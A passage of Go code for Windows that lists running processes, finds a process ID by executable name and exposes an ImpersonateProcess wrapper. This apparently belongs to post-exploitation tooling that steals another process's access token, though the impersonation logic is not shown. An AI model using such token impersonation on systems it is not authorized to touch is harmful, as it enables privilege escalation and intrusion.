		ret, _, _ = procProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&pe)))
	}
	return []byte(buf.String()), nil
}

func findPidByName(name string) (uint32, error) {
	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
	if int(snap) == -1 {
		return 0, fmt.Errorf("snapshot failed")
	}
	defer windows.CloseHandle(windows.Handle(snap))

	var pe PROCESSENTRY32W
	pe.DwSize = uint32(unsafe.Sizeof(pe))
	ret, _, _ := procProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&pe)))
	for ret != 0 {
		procName := syscall.UTF16ToString(pe.SzExeFile[:])
		if strings.EqualFold(procName, name) {
			return pe.Th32ProcessID, nil
		}
		ret, _, _ = procProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&pe)))
	}
	return 0, fmt.Errorf("process %s not found", name)
}

func ImpersonateProcess(pid uint32) ([]byte, error) {
	return impersonateProcessToken(pid)
}
